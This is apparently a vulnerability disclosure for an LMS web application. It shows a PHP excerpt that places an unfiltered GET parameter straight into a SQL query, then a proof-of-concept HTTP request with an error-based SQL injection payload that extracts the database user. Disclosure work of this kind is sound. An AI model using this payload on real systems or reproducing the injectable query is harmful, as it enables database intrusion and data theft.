### Vulnerability file address

`qr/Update.php` from line 38

The incoming $id variable is not filtered, there is sql injection

```php
......
......
......
$id = $_GET['king'];
$sql = "SELECT * FROM student WHERE id = '$id' ";
$query = $conn->query($sql) or die($conn->error);
$row = $query->fetch_assoc();
......
......
......
```

### POC

not exists any precondition

```http
GET /qr/Update.php?king=2'+and+(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))+%23&= HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220702180556340](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702180556.png)

